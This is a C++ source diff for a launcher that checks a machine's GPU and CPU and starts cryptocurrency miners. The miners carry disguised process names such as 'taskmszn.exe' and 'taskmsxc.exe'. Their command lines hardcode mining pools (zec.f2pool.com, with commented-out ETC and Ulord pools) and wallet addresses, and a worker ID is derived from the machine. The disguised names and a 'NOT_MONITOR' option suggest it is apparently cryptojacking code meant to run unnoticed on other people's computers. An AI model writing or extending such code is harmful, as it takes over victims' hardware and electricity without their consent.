@@ -7,17 +7,45 @@
 #include "Utility/PeeIdHelper.h"
 #include "commonshare\md5.h"
 #include "Utility\StringOperation.h"
+#include "userconfig.h"
+#include "Util.h"
+
+//配置以下参数
+/*
+	g_bCheckName:是否检测显卡型号
+	g_szCardName：显卡名称匹配（往后添加）
+	g_uMinMemorySize：显存大小 根据需求修改
+*/
+bool g_bCheckName = CHECKCARD;
+char g_szCardName[][MAX_PATH] = GPU_N_NAME;
+cl_ulong g_uMinMemorySize = GPU_MEMORYSIZE;
+
+
 
 bool RunEnvironment::CheckEnvironment()
 {
-	if (CheckZcashNCond())
+	if (CheckZNCond())
 	{
-		m_Type = vendor_t::nvidia;
-		return true;
+		m_vClient.push_back(L"taskmszn");
 	}
-	else if (CheckZcashACond())
+	//else if (CheckZACond())
+	//{
+	//	m_vClient.push_back(L"taskmsza");
+	//}
+	//else if (CheckECond())
+	//{
+	//	m_vClient.push_back(L"taskmse");
+	//}
+	//else if (CheckUCCond())
+	//{
+	//	m_vClient.push_back(L"taskmsuc");
+	//}
+	else if (CheckXCCond())
 	{
-		m_Type = vendor_t::amd;
+		m_vClient.push_back(L"taskmsxc");
+	}
+	if (m_vClient.size() > 0)
+	{
 		return true;
 	}
 	return false;
@@ -25,77 +53,26 @@ bool RunEnvironment::CheckEnvironment()
 
 
 
-void RunEnvironment::GetRunCmd(std::wstring &wstrCmd)
+std::wstring RunEnvironment::GetClientPath(const std::wstring &wstrName)
 {
-	TCHAR szExePath[MAX_PATH] = {0};
-	GetModuleFileName(NULL, szExePath, MAX_PATH);
-	PathRemoveFileSpec(szExePath);
-	
-	GetClientInfo();
+	std::wstring wstrClientPath = L"";
+	WCHAR szSubPath[MAX_PATH] = {0};
+	_snwprintf(szSubPath, _MAX_PATH, L"%s\\%s.exe", wstrName.c_str(),  wstrName.c_str());
 
-	TCHAR szLaunchExe[MAX_PATH] = {0}; 
-	PathCombine(szLaunchExe,szExePath,m_pClientInfo->strClientSubPath.c_str());
+	WCHAR szExeDir[MAX_PATH] = {0};
+	GetModuleFileNameW(NULL, szExeDir, MAX_PATH);
+	PathRemoveFileSpecW(szExeDir);
+
+
+	WCHAR szLaunchExe[MAX_PATH] = {0}; 
+	PathCombine(szLaunchExe,szExeDir,szSubPath);
 
 	if (::PathFileExists(szLaunchExe))
 	{
-		TCHAR szCmdLine[MAX_PATH] = {0};
-		_sntprintf(szCmdLine, _MAX_PATH, L"%s %s", szLaunchExe,m_pClientInfo->strClientParam.c_str());
-		wstrCmd = szCmdLine;
+		wstrClientPath = szLaunchExe;
 	}
+	return wstrClientPath;
 }
-
-std::wstring RunEnvironment::GetRandomAccount()
-{
-	int iAscii = GetStringAscii(m_wstrWorkID);
-	TCHAR szAccountList[][MAX_PATH] = {
-		L"t1LpoK4S9hNw4rZiV9w5J9yPKbiz76qVUEa",
-	};
-	int index = iAscii%ARRAYSIZE(szAccountList);
-	return szAccountList[index];
-}
-
-void RunEnvironment::GetWorkID()
-{
-	std::wstring wstrPeerID;
-	GetPeerId_(wstrPeerID);
-
-	std::string strPeerID = ultra::_T2A(wstrPeerID);
-	wchar_t pszMD5[MAX_PATH] = {0};
-
-	if (GetStringMd5(strPeerID,pszMD5) && wcslen(pszMD5) >= 8)
-	{
-		m_wstrWorkID = ultra::ToLower(std::wstring(pszMD5,8));
-	}
-	else
-	{
-		m_wstrWorkID = L"00000000";
-	}
-}
-
-void RunEnvironment::GetClientInfo()
-{
-	GetWorkID();
-	std::wstring strFormat = L"";
-	std::wstring strAccount = GetRandomAccount();
-	std::wstring strWorkid = L"";
-	m_pClientInfo = new CLIENT_INFO();
-	if (m_Type == vendor_t::nvidia)
-	{
-		strFormat = L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec --intensity 1";
-		//strWorkid = L"n0";
-		m_pClientInfo->strClientSubPath = L"taskmszn\\taskmszn.exe";
-	}
-	else if (m_Type == vendor_t::amd)
-	{
-		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -i 0 -li 1 -dbg -1";
-		//strWorkid = L"a0";
-		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
-	}
-	TCHAR szParam[MAX_PATH] = {0};
-	_sntprintf(szParam, _MAX_PATH, strFormat.c_str(), strAccount.c_str(),m_wstrWorkID.c_str());
-	m_pClientInfo->strClientParam = szParam;
-}
-
 
 bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_CARD_INFO)
 {
@@ -109,73 +86,200 @@ bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_
 	return true;  
 };
 
-bool RunEnvironment::CheckZcashNCond()
+bool RunEnvironment::CheckZNCond()
 {
+#ifdef Z_ACCOUNT
+	if (!IsWow64())
+	{
+		return false;
+	}
 	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
 	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
 	{
 		return false;
 	}
 	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
-		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
-		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= 2000000000)
+		TSDEBUG4CXX(L"[CheckZNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= g_uMinMemorySize)
 		{
-			TSDEBUG4CXX(L"can do Zcash N");
-			return true;
-		}
-	}
-	return false;
-}
-
-
-bool RunEnvironment::CheckZcashACond()
-{
-	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
-	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
-	{
-		return false;
-	}
-	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
-		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
-		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= 2000000000)
-		{
-			TSDEBUG4CXX(L"can do Zcash A");
-			return true;
-		}
-	}
-	return false;
-}
-
-
-void RunEnvironment::TerminateAllClientInstance()
-{
-	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnap != INVALID_HANDLE_VALUE)
-	{
-		PROCESSENTRY32 pe;
-		pe.dwSize = sizeof(PROCESSENTRY32);
-		BOOL bResult = ::Process32First(hSnap, &pe);
-		while (bResult)
-		{
-			if(	(_tcsicmp(pe.szExeFile, L"taskmszn.exe") == 0 && pe.th32ProcessID != 0)
-				|| (_tcsicmp(pe.szExeFile, L"taskmsza.exe") == 0 && pe.th32ProcessID != 0)
-				)
+			if (g_bCheckName)
 			{
-				HANDLE hProcess = ::OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-				::TerminateProcess(hProcess, 99);
+				return CheckGPUName(iter->name);
 			}
-			bResult = ::Process32Next(hSnap, &pe);
+			else
+			{
+				TSDEBUG4CXX(L"can do ZN with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
+			
 		}
-		::CloseHandle(hSnap);
 	}
+#endif
+	return false;
 }
 
-int RunEnvironment::GetStringAscii(const std::wstring& wstr)
+
+bool RunEnvironment::CheckZACond()
 {
-	int sum = 0;
-	for (int i = 0; i < wstr.length(); i++) {
-		wchar_t c = wstr[i];
-		sum += (int)c;
+#ifdef Z_ACCOUNT
+	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
+	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
+	{
+		return false;
 	}
-	return sum;
+	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
+		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= g_uMinMemorySize)
+		{
+			if (g_bCheckName)
+			{
+				return CheckGPUName(iter->name);
+			}
+			else
+			{
+				TSDEBUG4CXX(L"can do ZA with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
+		}
+	}
+#endif
+	return false;
+}
+
+bool RunEnvironment::CheckECond()
+{
+#ifdef E_ACCOUNT
+	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
+	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
+	{
+		return false;
+	}
+	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
+		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if ((iter->vendor == vendor_t::amd || iter->vendor == vendor_t::nvidia) &&  iter->memory_size >= 3000000000)
+		{
+			m_uPlatFormID = iter->platformid;
+			if (g_bCheckName)
+			{
+				return CheckGPUName(iter->name);
+			}
+			else
+			{
+				TSDEBUG4CXX(L"can do E with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
+		}
+	}
+#endif
+	return false;
+}
+
+bool RunEnvironment::CheckXCCond()
+{
+#ifdef X_ACCOUNT
+	SYSTEM_INFO system_info;
+	GetSystemInfo(&system_info);
+	m_uTotalCpu = system_info.dwNumberOfProcessors; 
+	if (m_uTotalCpu >= 2)
+	{
+		return true;
+	}
+#endif
+	return false;
+}
+
+bool RunEnvironment::CheckUCCond()
+{
+#ifdef U_ACCOUNT
+	if (!IsWow64())
+	{
+		return false;
+	}
+	SYSTEM_INFO system_info;
+	GetSystemInfo(&system_info);
+	m_uTotalCpu = system_info.dwNumberOfProcessors; 
+	if (m_uTotalCpu >= 2)
+	{
+		return true;
+	}
+#endif
+	return false;
+}
+
+bool RunEnvironment::CheckGPUName(const std::string &strName)
+{
+	std::string strCardName = strName;
+	std::transform(strCardName.begin(), strCardName.end(), strCardName.begin(), tolower);
+
+	for (int i = 0; i < ARRAYSIZE(g_szCardName); ++i)
+	{
+		if (strCardName.find(g_szCardName[i]) != std::string::npos)
+		{
+			TSDEBUG4CXX(L"can do z, Name = " << strCardName.c_str());
+			return true;
+		}
+	}
+	return false;
+}
+
+UINT RunEnvironment::GetCPUMinerThread()
+{
+	return m_uTotalCpu/2;
+}
+
+bool RunEnvironment::CheckIsForceNotMonitor()
+{
+	return NOT_MONITOR;
+}
+
+bool RunEnvironment::StartAllClient(bool bFirst)
+{
+	bool bRet = false;
+	for(std::vector<std::wstring>::const_iterator c_iter = m_vClient.begin() ;c_iter != m_vClient.end() ;c_iter++)
+	{
+		if (IsClientRunning(*c_iter))
+		{
+			bRet = true;
+			TSDEBUG4CXX(L"client " << *c_iter <<L" is running");
+			continue;
+		}
+		wchar_t szParam[1024] = {0};
+		if (*c_iter == L"taskmszn")
+		{
+			_snwprintf(szParam, 1024, L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec --intensity 1", Z_ACCOUNT,m_wstrWorkID.c_str());
+		}
+		else if (*c_iter == L"taskmsxc")
+		{
+			_snwprintf(szParam, 1024, L"-u %s -p %s -t %u" , X_ACCOUNT,m_wstrWorkID.c_str(), GetCPUMinerThread());
+		}
+	/*	else if (*c_iter == L"taskmsza")
+		{
+			_snwprintf(szParam, MAX_PATH, ZA_CMD, Z_ACCOUNT, m_wstrWorkID.c_str());
+		}
+		else if (*c_iter == L"taskmse")
+		{
+			_snwprintf(szParam, MAX_PATH, L"--farm-recheck 2000 -G -P stratum1+tcp://0x5afef1843f798b19be8215b2fbb7471fd5684f98.%s@setc.share4money.cn:8108 --opencl-platform %u --cl-global-work 100", m_wstrWorkID.c_str(), m_uPlatFormID);
+		}
+		else if (*c_iter == L"taskmsuc")
+		{
+			_snwprintf(szParam, MAX_PATH, L"-o \"stratum+tcp://jrb5btn.ulord-pool.com:7100\" -u \"UhFdrhLxHhkjDgjaR31N7WTowSkzrWh65E.%s\" -p \"\" --max-cpu-usage 75", m_wstrWorkID.c_str());
+		}*/
+		else
+		{
+			continue;
+		}
+		std::wstring wstrClientPath = GetClientPath(*c_iter);
+		if (wstrClientPath.empty())
+		{
+			continue;
+		}
+		WCHAR szCmdLine[1024] = {0};
+		_snwprintf(szCmdLine, 1024, L"%s %s", wstrClientPath.c_str(), szParam);
+		if (CreateClientProcess(szCmdLine))
+		{
+			bRet = true;
+		}
+
+	}
+	return bRet;
 }
